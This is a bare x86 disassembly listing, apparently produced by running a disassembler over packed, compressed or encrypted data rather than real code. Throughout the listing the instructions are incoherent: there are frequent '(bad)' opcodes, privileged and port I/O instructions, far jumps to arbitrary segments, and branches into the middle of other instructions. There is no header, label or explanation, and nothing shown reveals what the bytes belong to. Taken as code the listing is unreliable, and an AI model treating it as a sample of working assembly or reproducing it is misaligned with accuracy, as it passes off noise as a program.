  41d19e:	xor    BYTE PTR [edi+0x14],ch
  41d1a1:	fwait
  41d1a2:	adc    BYTE PTR ds:0xcbc1e54a,ah
  41d1a8:	jae    0x41d12c
  41d1aa:	dec    edi
  41d1ab:	repnz sar BYTE PTR [edx-0x7e2b554e],cl
  41d1b2:	push   ebp
  41d1b3:	mov    al,0x1e
  41d1b5:	lahf   
  41d1b6:	hlt    
  41d1b7:	dec    edi
  41d1b8:	push   es
  41d1b9:	mov    BYTE PTR [edi+0x69],ah
  41d1bc:	jge    0x41d1f3
  41d1be:	sub    eax,DWORD PTR [edx+0x17b37ab]
  41d1c4:	(bad)  
  41d1c5:	fmul   DWORD PTR [esi+esi*1-0x19]
  41d1c9:	ins    DWORD PTR es:[edi],dx
  41d1ca:	test   DWORD PTR [ebx-0x17],esp
  41d1cd:	jns    0x41d1b8
  41d1cf:	mov    ecx,0xe766ad2e
  41d1d4:	gs in  al,0x34
  41d1d7:	inc    ecx
  41d1d8:	(bad)  
  41d1d9:	in     eax,dx
  41d1da:	mov    WORD PTR [edi],fs
  41d1dc:	xchg   edi,eax
  41d1dd:	mov    cl,al
  41d1df:	xor    al,0xe1
  41d1e1:	sbb    edx,DWORD PTR [edi+0x7a]
  41d1e4:	mov    ds:0x1c6b72e,eax
  41d1e9:	lock adc esi,DWORD PTR [edi]
  41d1ec:	sar    DWORD PTR [ecx-0x36],0x9c
  41d1f0:	(bad)  
  41d1f1:	fisttp WORD PTR [ebx+0x421a57f0]
  41d1f7:	ret    
  41d1f8:	iret   
  41d1f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1fa:	mov    al,ds:0x29fe9bfd
  41d1ff:	lods   al,BYTE PTR ds:[esi]
  41d200:	call   0xcdc5d9d4
  41d205:	retf   
  41d206:	mov    ah,BYTE PTR [eax+ebp*2]
  41d209:	les    edi,FWORD PTR [edi]
  41d20b:	outs   dx,DWORD PTR ds:[esi]
  41d20c:	or     eax,0x23dc4943
  41d211:	lock out 0xdc,eax
  41d214:	aam    0xb4
  41d216:	mov    ds:0xcfbcfe2a,al
  41d21b:	aaa    
  41d21c:	xor    eax,0xef3ee365
  41d221:	mov    dl,BYTE PTR [ebp-0xefdd91b]
  41d227:	jle    0x41d2a4
  41d229:	fsub   DWORD PTR [si]
  41d22c:	xchg   DWORD PTR [ebx],ecx
  41d22e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d22f:	jo     0x41d22f
  41d231:	adc    BYTE PTR [edx-0x7e6ee73c],cl
  41d237:	fsub   QWORD PTR ds:0xe88ff372
  41d23d:	fild   QWORD PTR [eax+0x6e0de2f8]
  41d243:	push   cs
  41d244:	and    eax,0x2c31a4ed
  41d249:	imul   DWORD PTR [esi+ecx*2-0x47]
  41d24d:	adc    edi,ecx
  41d24f:	test   eax,0xfbc2d26f
  41d254:	bound  ebp,QWORD PTR [ebp+0x45b8bf80]
  41d25a:	(bad)  
  41d25b:	aas    
  41d25c:	push   ecx
  41d25d:	inc    ebx
  41d25e:	xor    BYTE PTR [eax],dl
  41d260:	inc    ebp
  41d261:	and    al,0x2e
  41d263:	mov    ds:0x698b997,al
  41d268:	popa   
  41d269:	mov    ebp,DWORD PTR [ecx-0x2b8fc503]
  41d26f:	lods   al,BYTE PTR ds:[esi]
  41d270:	xor    BYTE PTR [ebx],al
  41d272:	dec    ebp
  41d273:	sub    al,0x0
  41d275:	sub    al,0x9a
  41d277:	outs   dx,DWORD PTR ds:[esi]
  41d278:	adc    BYTE PTR [edx],0xa4
  41d27b:	pop    edi
  41d27c:	cmp    eax,0xda24d634
  41d281:	mov    dl,0x41
  41d283:	mov    bl,0x2f
  41d285:	xchg   si,ax
  41d287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d288:	inc    edx
  41d289:	fwait
  41d28a:	gs mov esi,0x58f1dd27
  41d290:	jge    0x41d2b0
  41d292:	shl    eax,cl
  41d294:	jns    0x41d29f
  41d296:	int3   
  41d297:	mov    eax,ds:0xcc6f0fa1
  41d29c:	push   ds
  41d29d:	adc    DWORD PTR [ebx],edx
  41d29f:	sbb    BYTE PTR cs:[edx+0x6c2011e2],al
  41d2a6:	jp     0x41d249
  41d2a8:	in     eax,dx
  41d2a9:	lock and eax,ebp
  41d2ac:	pop    es
  41d2ad:	jae    0x41d2bf
  41d2af:	fimul  WORD PTR [edi-0x7e]
  41d2b2:	sbb    al,0x86
  41d2b4:	pop    ss
  41d2b5:	adc    dh,ah
  41d2b7:	cmp    eax,DWORD PTR [edx+0x2d]
  41d2ba:	popa   
  41d2bb:	jno    0x41d292
  41d2bd:	pop    es
  41d2be:	les    esp,FWORD PTR [edx-0x2ec52ef]
  41d2c4:	sub    DWORD PTR [eax],esi
  41d2c6:	and    edi,DWORD PTR [ebp+0x237859e4]
  41d2cc:	das    
  41d2cd:	cmp    edx,DWORD PTR [eax]
  41d2cf:	fs jb  0x41d288
  41d2d2:	sub    al,0x50
  41d2d4:	sub    ecx,edx
  41d2d6:	push   ds
  41d2d7:	pop    edx
  41d2d8:	add    al,0xe2
  41d2da:	daa    
  41d2db:	jmp    0xe9362200
  41d2e0:	add    BYTE PTR [edx+esi*4],0xf1
  41d2e4:	mov    ah,0xb4
  41d2e6:	imul   ebx,DWORD PTR [ebx+0x5ce52e61],0xa7bd77a6
  41d2f0:	jle    0x41d2bf
  41d2f2:	stos   BYTE PTR es:[edi],al
  41d2f3:	pusha  
  41d2f4:	lods   eax,DWORD PTR ds:[esi]
  41d2f5:	xor    DWORD PTR [edx-0x16],ebx
  41d2f8:	and    DWORD PTR gs:[ecx+0x4871c0a5],ebp
  41d2ff:	sub    al,0x63
  41d301:	ins    DWORD PTR es:[edi],dx
  41d302:	data16 mov dh,0x94
  41d305:	mov    edi,ss
  41d307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d308:	fidivr DWORD PTR [eax+0x66]
  41d30b:	repz dec eax
  41d30d:	scas   al,BYTE PTR es:[edi]
  41d30e:	cmp    ah,bh
  41d310:	jmp    0x41d29e
  41d312:	retf   
  41d313:	dec    edi
  41d314:	rcr    DWORD PTR [edx+0x3e],1
  41d317:	push   esi
  41d318:	sar    BYTE PTR [ecx],1
  41d31a:	stos   BYTE PTR es:[edi],al
  41d31b:	cwde   
  41d31c:	lods   eax,DWORD PTR ds:[esi]
  41d31d:	adc    esp,edi
  41d31f:	fcomp  DWORD PTR [ecx-0x3c8ca083]
  41d325:	aaa    
  41d326:	sub    bl,dl
  41d328:	std    
  41d329:	xor    DWORD PTR [esp+edi*8],0xc6270543
  41d330:	xlat   BYTE PTR ds:[ebx]
  41d331:	cdq    
  41d332:	xor    al,BYTE PTR [edi]
  41d334:	xchg   esi,eax
  41d335:	push   cs
  41d336:	dec    edx
  41d337:	xor    ch,ch
  41d339:	pop    ebx
  41d33a:	daa    
  41d33b:	add    BYTE PTR [ebx],0x2f
  41d33e:	jle    0x41d342
  41d340:	shl    dh,1
  41d342:	sub    eax,0x43ba2031
  41d347:	dec    ecx
  41d348:	fdiv   st,st(5)
  41d34a:	dec    esi
  41d34b:	mov    al,ds:0xbfa2f97c
  41d350:	retf   0xd583
  41d353:	outs   dx,BYTE PTR ds:[esi]
  41d354:	or     DWORD PTR [ebx-0x10],0xffffffb0
  41d358:	push   0x5d7f7a7
  41d35d:	sahf   
  41d35e:	stc    
  41d35f:	or     BYTE PTR [edx-0x55649d65],ah
  41d365:	jnp    0x41d350
  41d367:	daa    
  41d368:	mov    BYTE PTR [esi],ah
  41d36a:	bound  ebx,QWORD PTR [esi]
  41d36c:	test   eax,0x62260287
  41d371:	pop    esp
  41d372:	xor    DWORD PTR [esp],ecx
  41d375:	fwait
  41d376:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d377:	push   ecx
  41d378:	xacquire xchg DWORD PTR [eax-0x2d7400c8],esi
  41d37f:	sbb    BYTE PTR [edi+0x22],ah
  41d382:	loopne 0x41d3ee
  41d384:	ret    
  41d385:	jmp    0x647c:0x63a1012a
  41d38c:	mov    cs,edi
  41d38e:	xchg   ebx,eax
  41d38f:	xor    al,0x32
  41d391:	pop    edx
  41d392:	loop   0x41d3a8
  41d394:	adc    al,0x57
  41d396:	dec    edi
  41d397:	inc    ecx
  41d398:	dec    edi
  41d399:	in     al,dx
  41d39a:	and    dh,BYTE PTR [eax+eiz*4-0x45]
  41d39e:	push   eax
  41d39f:	lea    ebp,[ecx+0x7ce67997]
  41d3a5:	clc    
  41d3a6:	ret    
  41d3a7:	jmp    0x795f:0x3811cf89
  41d3ae:	call   0xa9e2384c
  41d3b3:	clc    
  41d3b4:	and    esp,DWORD PTR [edi+ecx*2-0x9]
  41d3b8:	das    
  41d3b9:	add    eax,0x536c0a04
  41d3be:	sbb    BYTE PTR [eax],0x33
  41d3c1:	jmp    0xac6f:0xb3f40da9
  41d3c8:	pop    eax
  41d3c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3ca:	(bad)  
  41d3cb:	adc    ebp,edi
  41d3cd:	jmp    0x652c:0x46c26ee6
  41d3d4:	loop   0x41d3c3
  41d3d6:	cmp    al,0x8c
  41d3d8:	lahf   
  41d3d9:	dec    esi
  41d3da:	push   eax
  41d3db:	and    DWORD PTR ds:0xe6e9c505,0xffffff81
  41d3e2:	stos   DWORD PTR es:[edi],eax
  41d3e3:	mov    ebp,0x2e80e736
  41d3e8:	pop    ecx
  41d3e9:	sbb    DWORD PTR [edi+0x40],0xe8b893b4
  41d3f0:	jo     0x41d3ba
  41d3f2:	(bad)  
  41d3f3:	pop    ss
  41d3f4:	jbe    0x41d45b
  41d3f6:	fsub   DWORD PTR ss:[edi+0x2782e015]
  41d3fd:	add    DWORD PTR [eax],esp
  41d3ff:	lods   al,BYTE PTR ds:[esi]
  41d400:	lock mov WORD PTR [ebx+0x342dc2bc],?
  41d407:	(bad)  
  41d408:	sub    al,0x70
  41d40a:	leave  
  41d40b:	push   es
  41d40c:	mov    ebx,0x6a4c4f2
  41d411:	jb     0x41d3e4
  41d413:	adc    dl,BYTE PTR [ebp+0x17]
  41d416:	retf   
  41d417:	jge    0x41d48b
  41d419:	rcr    dh,1
  41d41b:	push   eax
  41d41c:	jno    0x41d3bc
  41d41e:	xchg   ebp,eax
  41d41f:	push   ecx
  41d420:	rol    ch,1
  41d422:	cmp    DWORD PTR [edi-0x5c6166cd],ecx
  41d428:	stos   BYTE PTR es:[edi],al
  41d429:	jns    0x41d406
  41d42b:	mov    bh,0x9d
  41d42d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d42e:	out    0xd1,al
  41d430:	jl     0x41d481
  41d432:	pop    edi
  41d433:	add    edx,esp
  41d435:	xor    al,0xcd
  41d437:	sub    al,0x53
  41d439:	mov    edi,0x3fe481fc
  41d43e:	add    al,0xa8
  41d440:	daa    
  41d441:	(bad)  
  41d442:	fiadd  DWORD PTR es:[edi+0x1e41f2d3]
  41d449:	gs jmp 0x6b66:0x1d1db96c
  41d451:	repz push cs
  41d453:	idiv   DWORD PTR fs:[edi-0x1beabb77]
  41d45a:	loope  0x41d441
  41d45c:	pop    eax
  41d45d:	mov    al,ds:0xaa1bd6fa
  41d462:	fwait
  41d463:	jae    0x41d409
  41d465:	mov    ecx,0x48ded63e
  41d46a:	mov    esi,DWORD PTR [eax+0x3b]
  41d46d:	sbb    eax,0xf7a19584
  41d472:	lock dec esp
  41d474:	push   es
  41d475:	test   DWORD PTR [edi+0x6e],0xf0aad62e
  41d47c:	or     BYTE PTR [ebx],0xef
  41d47f:	sub    BYTE PTR es:[eax],al
  41d482:	aas    
  41d483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d484:	sub    bh,al
  41d486:	mov    bl,0x9
  41d488:	ins    BYTE PTR es:[edi],dx
  41d489:	mov    esp,0x182b1783
  41d48e:	xor    eax,0xdcfcea6b
  41d493:	xchg   ebx,eax
  41d494:	sub    ch,ch
  41d496:	fisub  DWORD PTR [edi]
  41d498:	into   
  41d499:	stos   DWORD PTR es:[edi],eax
  41d49a:	mov    bl,0xb3
  41d49c:	retf   
  41d49d:	mov    cl,0x23
  41d49f:	or     DWORD PTR [eax+0x7b686353],0xaa9a0c1f
  41d4a9:	std    
  41d4aa:	sub    esp,DWORD PTR [ebx+0x53]
  41d4ad:	jl     0x41d49d
  41d4af:	jl     0x41d4e9
  41d4b1:	dec    esi
  41d4b2:	mov    ds:0xdc79af10,al
  41d4b7:	daa    
  41d4b8:	jle    0x41d4b2
  41d4ba:	loop   0x41d4fd
  41d4bc:	addr16 ja 0x41d4c7
  41d4bf:	xchg   ecx,eax
  41d4c0:	hlt    
  41d4c1:	icebp  
  41d4c2:	inc    ecx
  41d4c3:	loope  0x41d4f3
  41d4c5:	daa    
  41d4c6:	and    DWORD PTR es:[ebx+ecx*8],ecx
  41d4ca:	in     al,0x84
  41d4cc:	jae    0x41d4e5
  41d4ce:	jge    0x41d4d8
  41d4d0:	jns    0x41d514
  41d4d2:	sub    esi,esp
  41d4d4:	repnz call 0xe112:0x73d9b28a
  41d4dc:	pop    esi
  41d4dd:	or     edi,DWORD PTR [edi+0x37d5da65]
  41d4e3:	lods   eax,DWORD PTR ds:[esi]
  41d4e4:	aas    
  41d4e5:	xor    ah,ah
  41d4e7:	mov    esi,0x830b8707
  41d4ec:	mov    al,0x4c
  41d4ee:	mov    ebp,0xd830d47c
  41d4f3:	sbb    DWORD PTR [ebp+0x6bb9c307],ebp
  41d4f9:	outs   dx,BYTE PTR ds:[esi]
  41d4fa:	sub    edi,DWORD PTR [edx+edx*2+0x51]
  41d4fe:	or     eax,0x122f1109
  41d503:	push   DWORD PTR ds:0x482b7dfb
  41d509:	(bad)
  41d50d:	cwde   
  41d50e:	adc    bh,BYTE PTR [ebx-0x57c2a01]
  41d514:	sub    edx,DWORD PTR [edx]
  41d516:	dec    ebx
  41d517:	mov    al,ds:0xf27a8190
  41d51c:	loop   0x41d580
  41d51e:	mov    ebp,0x8c9388ca
  41d523:	stc    
  41d524:	cmp    DWORD PTR [eax-0x38],eax
  41d527:	into   
  41d528:	mov    BYTE PTR [ebp-0x6f8fced6],cl
  41d52e:	sub    dh,BYTE PTR [edx+0x20730ead]
  41d534:	mov    esp,0xf2ada76b
  41d539:	cmp    al,BYTE PTR ds:0x4e852d52
  41d53f:	xchg   ecx,eax
  41d540:	push   ebx
  41d541:	push   ds
  41d542:	(bad)  
  41d543:	jg     0x41d564
  41d545:	scas   al,BYTE PTR es:[edi]
  41d546:	cs in  al,0xf4
  41d549:	mov    dh,0xcd
  41d54b:	ins    BYTE PTR es:[edi],dx
  41d54c:	fist   WORD PTR [ebp+0x6b]
  41d54f:	mov    bh,0xfb
  41d551:	cwde   
  41d552:	and    bl,ah
  41d554:	popa   
  41d555:	sbb    DWORD PTR [ebx-0x2199844a],eax
  41d55b:	cmp    DWORD PTR ds:0x32b7fcf7,esi
  41d561:	or     al,0xf9
  41d563:	cli    
  41d564:	and    dl,BYTE PTR [eax-0x3a48ae97]
  41d56a:	ret    
  41d56b:	sbb    DWORD PTR [ebx],eax
  41d56d:	sub    dh,BYTE PTR [ebx+edi*8+0x1dbdf2ce]
  41d574:	dec    edx
  41d575:	xchg   edi,eax
  41d576:	arpl   WORD PTR [edx-0x4ed6459b],sp
  41d57c:	daa    
  41d57d:	jnp    0x41d58f
  41d57f:	loope  0x41d532
  41d581:	ret    
  41d582:	sti    
  41d583:	xchg   edx,eax
  41d584:	jo     0x41d524
  41d586:	jns    0x41d532
  41d588:	stos   BYTE PTR es:[edi],al
  41d589:	ins    DWORD PTR es:[edi],dx
  41d58a:	(bad)  
  41d58b:	adc    eax,0xc9dfcc7
  41d590:	push   cs
  41d591:	shl    BYTE PTR [edx+0x52],1
  41d594:	addr16 pop es
  41d596:	push   eax
  41d597:	out    dx,al
  41d598:	clc    
  41d599:	inc    esi
  41d59a:	jl     0x41d57f
  41d59c:	das    
  41d59d:	arpl   cx,ax
  41d59f:	jmp    0xe1b7:0x7925fd53
  41d5a6:	adc    eax,DWORD PTR [edi-0x4846e89]
  41d5ac:	cs (bad) 
  41d5af:	mov    ebx,0xf8a8823b
  41d5b4:	into   
  41d5b5:	icebp  
  41d5b6:	pop    ebx
  41d5b7:	mov    eax,0xa926d62d
  41d5bc:	sub    dl,BYTE PTR [edi]
  41d5be:	inc    edi
  41d5bf:	xchg   ecx,eax
  41d5c0:	add    ebp,0xffffffc4
  41d5c3:	or     ch,cl
  41d5c5:	jl     0x41d592
  41d5c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5c8:	xor    bl,dh
  41d5ca:	aas    
  41d5cb:	shr    BYTE PTR [ecx+0x47a0c642],0xbb
  41d5d2:	pop    edx
  41d5d3:	adc    al,0x0
  41d5d5:	sbb    eax,0xff068f41
  41d5da:	jbe    0x41d650
  41d5dc:	or     DWORD PTR [edx-0x77091118],ebp
  41d5e2:	icebp  
  41d5e3:	cli    
  41d5e4:	cmp    eax,0x2a73e16
  41d5e9:	mov    dh,0x1a
  41d5eb:	pop    ebx
  41d5ec:	mov    dl,0x48
  41d5ee:	shl    ebp,0xf9
  41d5f1:	dec    esi
  41d5f2:	imul   ebp,DWORD PTR [esi-0x22dd0485],0x45
  41d5f9:	mov    bh,dl
  41d5fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5fc:	xor    DWORD PTR [edx+eiz*1],edx
  41d5ff:	sti    
  41d600:	mov    cl,0xc4
  41d602:	sub    ebx,DWORD PTR [esi-0x2b1ee56e]
  41d608:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d609:	sub    DWORD PTR [ebp-0x2d071d0e],ecx
  41d60f:	lea    esp,[edx]
  41d611:	sub    al,0xcc
  41d613:	stc    
  41d614:	imul   bl
  41d616:	loopne 0x41d5fe
  41d618:	fcmovnb st,st(7)
  41d61a:	dec    esp
  41d61b:	cmp    eax,0xfda27f9
  41d620:	test   bh,0x30
  41d623:	das    
  41d624:	je     0x41d67b
  41d626:	cmc    
  41d627:	ret    
  41d628:	in     al,dx
  41d629:	xor    DWORD PTR [ebp+0x634d2bc3],esi
  41d62f:	sbb    dl,BYTE PTR [ebp+ecx*4+0x1a]
  41d633:	loope  0x41d61c
  41d635:	push   ebp
  41d636:	dec    esp
  41d637:	rcl    DWORD PTR [edx-0x657e6d3],0x9
  41d63e:	xlat   BYTE PTR ds:[ebx]
  41d63f:	xlat   BYTE PTR ds:[ebx]
  41d640:	(bad)  
  41d641:	jmp    0x41d687
  41d643:	mov    ebp,DWORD PTR [ebx]
  41d645:	(bad)  
  41d646:	cmp    BYTE PTR [eax+0x57e9189],al
  41d64c:	sbb    DWORD PTR [ebp-0x4e3ed4b4],esp
  41d652:	cmp    ebp,DWORD PTR [edx+0x4de2fcdb]
  41d658:	adc    BYTE PTR [edi-0x1089870d],al
  41d65e:	dec    ecx
  41d65f:	mov    edx,0x1b10e84b
  41d664:	sub    BYTE PTR [esi],0x3
  41d667:	inc    eax
  41d668:	xor    cl,0x60
  41d66b:	inc    esp
  41d66c:	or     esp,DWORD PTR [esi+0x5b]
  41d66f:	(bad)  
  41d670:	or     bl,BYTE PTR [ecx+ebx*1-0x4e1039d]
  41d677:	mov    ds:0x96feac11,al
  41d67c:	pop    edi
  41d67d:	jecxz  0x41d6af
  41d67f:	call   0x8ac5:0x4215084f
  41d686:	mov    al,0xa6
  41d688:	repz jae 0x41d6a5
  41d68b:	or     DWORD PTR [edx+0xa],ebp
  41d68e:	aad    0xdc
  41d690:	xor    eax,0xf3e152c3
  41d695:	jnp    0x41d6cd
  41d697:	dec    edi
  41d698:	push   ebp
  41d699:	sahf   
  41d69a:	rcl    DWORD PTR [edi],cl
  41d69c:	or     ebx,esi
  41d69e:	push   edi
  41d69f:	enter  0x17e,0x75
  41d6a3:	ret    0x3b5f
  41d6a6:	cmp    ch,BYTE PTR [ebx+0x32]
  41d6a9:	outs   dx,BYTE PTR ds:[esi]
  41d6aa:	sahf   
  41d6ab:	xchg   esp,eax
  41d6ac:	pop    esi
  41d6ad:	dec    ecx
  41d6ae:	or     eax,0x3bb8d7b7
  41d6b3:	jmp    0x41d6b2
  41d6b5:	push   eax
  41d6b6:	ss in  eax,dx
  41d6b8:	sbb    DWORD PTR [edi-0x2d],esp
  41d6bb:	out    dx,eax
  41d6bc:	ficom  DWORD PTR ds:0x91ab8af0
  41d6c2:	stc    
  41d6c3:	push   ecx
  41d6c4:	arpl   WORD PTR [esi+0x29],di
  41d6c7:	sub    DWORD PTR [ebp+0x48a73f68],edx
  41d6cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6ce:	xor    BYTE PTR [ebx],dl
  41d6d0:	push   ebx
  41d6d1:	lds    ebx,FWORD PTR [esi-0x5a]
  41d6d4:	push   edi
  41d6d5:	retf   
  41d6d6:	daa    
  41d6d7:	pop    edx
  41d6d8:	fcomp  QWORD PTR [edx+eiz*4-0x13d1f7b9]
  41d6df:	idiv   DWORD PTR [ebp-0x57e29179]
  41d6e5:	call   0x11e3570
  41d6ea:	add    DWORD PTR [ecx-0x78],ebx
  41d6ed:	int    0x1f
  41d6ef:	xchg   DWORD PTR [esi],esp
  41d6f1:	xor    ch,al
  41d6f3:	(bad)  
  41d6f5:	(bad)  
  41d6f6:	or     cl,bh
  41d6f8:	sbb    edx,DWORD PTR [ecx+0x45]
  41d6fb:	cdq    
  41d6fc:	(bad)  
  41d6fe:	cwde   
  41d6ff:	stos   DWORD PTR es:[edi],eax
  41d700:	and    edx,DWORD PTR [eax]
  41d702:	ja     0x41d6ca
  41d704:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d705:	jns    0x41d6fa
  41d707:	jae    0x41d74e
  41d709:	inc    esi
  41d70a:	dec    ebx
  41d70b:	fcom   QWORD PTR [edx]
  41d70d:	xchg   DWORD PTR ds:0x2f89dc40,edx
  41d713:	cwde   
  41d714:	and    ch,cl
  41d716:	jo     0x41d6f6
  41d718:	xlat   BYTE PTR ds:[ebx]
  41d719:	mov    BYTE PTR [ecx+edi*8],0xd
  41d71d:	or     eax,0x34b56eda
  41d722:	add    edx,DWORD PTR [ebx]
  41d724:	cmp    cl,ah
  41d726:	dec    ecx
  41d727:	jge    0x41d701
  41d729:	ret    
  41d72a:	test   dl,ah
  41d72c:	add    dh,ch
  41d72e:	enter  0x2fb,0x94
  41d732:	icebp  
  41d733:	arpl   di,ax
  41d735:	mov    DWORD PTR [eax-0x46],0x26d1cf29
  41d73c:	lahf   
  41d73d:	pop    edx
  41d73e:	adc    al,dl
  41d740:	mov    al,0x28
  41d742:	cmc    
  41d743:	in     al,0x36
  41d745:	pop    es
  41d746:	jmp    0x685d:0xcf216bc2
  41d74d:	push   ecx
  41d74e:	adc    DWORD PTR [ecx],ebx
  41d750:	mov    ds:0x692674d9,al
  41d755:	sahf   
  41d756:	(bad)  
  41d758:	pop    esi
  41d759:	mov    eax,tr1
  41d75c:	repnz inc ebx
  41d75e:	enter  0xcdb3,0x6b
  41d762:	mov    ah,0x4b
  41d764:	add    al,0xd7
  41d766:	adc    al,0x23
  41d768:	cwde   
  41d769:	adc    DWORD PTR [ecx],eax
  41d76b:	inc    esi
  41d76c:	jg     0x41d735
  41d76e:	cmc    
  41d76f:	retf   0x6e2
  41d772:	add    eax,0x1279a2c5
  41d777:	sahf   
  41d778:	mov    al,0x99
  41d77a:	xor    eax,0xfe10cc18
  41d77f:	inc    esp
  41d780:	xchg   DWORD PTR [edi],eax
  41d782:	mov    bh,0x3f
  41d784:	outs   dx,BYTE PTR ds:[esi]
  41d785:	and    eax,0xb4f227c2
  41d78a:	pop    esp
  41d78b:	ret    
  41d78c:	add    eax,0x66944b88
  41d791:	mov    ch,BYTE PTR [edx-0x21]
  41d794:	mov    ah,0x81
  41d796:	sti    
  41d797:	mov    esi,0xca61c5f4
  41d79c:	test   eax,0x20f7f8cd
  41d7a1:	mov    ebp,DWORD PTR [ebx-0x2]
  41d7a4:	aad    0x67
  41d7a6:	inc    esp
  41d7a7:	add    ah,BYTE PTR [eax+0x7d]
  41d7aa:	mov    bl,0x15
  41d7ac:	(bad)  [edi]
  41d7ae:	xchg   edi,eax
  41d7af:	adc    ecx,esp
  41d7b1:	mov    ch,0x70
  41d7b3:	ret    0x4bd6
  41d7b6:	dec    ebx
  41d7b7:	push   esp
  41d7b8:	push   eax
  41d7b9:	popa   
  41d7ba:	ins    DWORD PTR es:[edi],dx
  41d7bb:	and    ah,BYTE PTR [ecx+0x29]
  41d7be:	out    0x52,al
  41d7c0:	adc    al,0xc1
  41d7c2:	sub    ebp,DWORD PTR [eax]
  41d7c4:	sti    
  41d7c5:	adc    cl,BYTE PTR [ebx+0x4d16f92]
  41d7cb:	xor    al,0xd1
  41d7cd:	add    BYTE PTR [ebx],dh
  41d7cf:	idiv   DWORD PTR [ebx]
  41d7d1:	cmp    edx,DWORD PTR [esi-0x79999c5d]
  41d7d7:	inc    eax
  41d7d8:	and    ebx,DWORD PTR [edi+0x3114cb1b]
  41d7de:	and    DWORD PTR [edx+0x354da4c],0x6a
  41d7e5:	pop    ds
  41d7e6:	adc    esi,DWORD PTR [ebx+0x2f]
  41d7e9:	xchg   ecx,eax
  41d7ea:	pop    ds
  41d7eb:	test   al,0x2e
  41d7ed:	xor    esp,0xffffff80
  41d7f0:	or     eax,0x1cbc7a0
  41d7f5:	jmp    0x41d7e8
  41d7f7:	jmp    0x41d78a
  41d7f9:	sbb    eax,0xb867de67
  41d7fe:	ss and eax,0x97ad086f
  41d804:	pusha  
  41d805:	sub    al,0xa8
  41d807:	in     al,0xde
  41d809:	popa   
  41d80a:	fcmovnbe st,st(6)
  41d80c:	sti    
  41d80d:	fdiv   QWORD PTR [ebp-0x24]
  41d810:	std    
  41d811:	stos   DWORD PTR es:[edi],eax
  41d812:	sbb    DWORD PTR [ebx-0x6320556e],ebx
  41d818:	lock stos DWORD PTR es:[edi],eax
  41d81a:	adc    eax,0xdca879ae
  41d81f:	std    
  41d820:	ss fsub st(0),st
  41d823:	stc    
  41d824:	cmp    eax,0x8c1d11fd
  41d829:	outs   dx,BYTE PTR ds:[esi]
  41d82a:	dec    edx
  41d82b:	and    BYTE PTR [ebx+0x6f8917ee],bh
  41d831:	sahf   
  41d832:	add    DWORD PTR ds:0x40640566,0x5e988ca0
  41d83c:	iret   
  41d83d:	adc    DWORD PTR [esi+0x4e],0x51
  41d841:	pop    ds
  41d842:	or     eax,0x22b661ed
  41d847:	pop    ebp
  41d848:	test   al,0xa7
  41d84a:	shl    DWORD PTR [edx*4-0x5843fbf],0x52
  41d852:	xor    eax,DWORD PTR [eax-0xbe2bd55]
  41d858:	(bad)  
  41d859:	mov    eax,ds:0xaa59a9df
  41d85e:	or     DWORD PTR [edx-0x24],edx
  41d861:	adc    ebp,DWORD PTR [ecx+0x5df94005]
  41d867:	hlt    
  41d868:	xor    BYTE PTR [edi-0x514fcb3f],bl
  41d86e:	out    dx,al
  41d86f:	jo     0x41d87b
  41d871:	xchg   BYTE PTR [esi-0x23],ah
  41d874:	(bad)  
  41d875:	shr    edi,cl
  41d877:	jg     0x41d8dd
  41d879:	sbb    al,0xc0
  41d87b:	mov    cl,0xd0
  41d87d:	mov    dh,0x76
  41d87f:	mov    ah,0xda
  41d881:	mov    ah,0x37
  41d883:	pop    ss
  41d884:	das    
  41d885:	jmp    0x41d8f6
  41d887:	mov    edi,0xd8976adc
  41d88c:	mul    ecx
  41d88e:	call   DWORD PTR [ebx-0x54e58c42]
  41d894:	xchg   edx,eax
  41d895:	pop    edi
  41d896:	xchg   ebp,eax
  41d897:	and    eax,0xb36ecb25
  41d89c:	jge    0x41d8d8
  41d89e:	and    al,0xbf
  41d8a0:	xor    edx,DWORD PTR [esi]
  41d8a2:	int3   
  41d8a3:	mov    esp,0xb8ff90b
  41d8a8:	mov    ecx,0xd767b2bb
  41d8ad:	sbb    ecx,DWORD PTR [ecx+0x7d5a0374]
  41d8b3:	mov    ebx,0x9260b07
  41d8b8:	enter  0x4553,0x7
  41d8bc:	jo     0x41d8d9
  41d8be:	xchg   ebx,eax
  41d8bf:	bound  ebx,QWORD PTR ds:0x6bd40b
  41d8c5:	mov    BYTE PTR ds:0xf549453b,ch
  41d8cb:	shl    DWORD PTR ds:0xdef6791,cl
  41d8d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8d2:	stc    
  41d8d3:	add    DWORD PTR ds:0x3a3eba0f,esp
  41d8d9:	retf   
  41d8da:	cmc    
  41d8db:	sbb    dh,BYTE PTR [ebx+eax*8+0x6c23a22d]
  41d8e2:	stos   DWORD PTR es:[edi],eax
  41d8e3:	enter  0x127b,0x37
  41d8e7:	arpl   di,bp
  41d8e9:	ins    BYTE PTR es:[edi],dx
  41d8ea:	jecxz  0x41d8a2
  41d8ec:	mov    eax,eax
  41d8ee:	mov    ch,BYTE PTR [ebp-0x28304a38]
  41d8f4:	and    DWORD PTR [eax-0x5001a227],eax
  41d8fa:	xor    eax,0xd4df3ff4
  41d8ff:	test   eax,0xd38379c8
  41d904:	jnp    0x41d91b
  41d906:	sbb    ecx,DWORD PTR [esi+eiz*8+0x2acb718d]
  41d90d:	mov    bl,dh
  41d90f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d910:	sbb    ecx,DWORD PTR [edi-0x70]
  41d913:	loope  0x41d991
  41d915:	push   ds
  41d916:	sbb    edi,esi
  41d918:	div    BYTE PTR [ebx]
  41d91a:	xor    al,0xbd
  41d91c:	aas    
  41d91d:	ffreep st(4)
  41d91f:	inc    esp
  41d920:	enter  0x47dd,0xfb
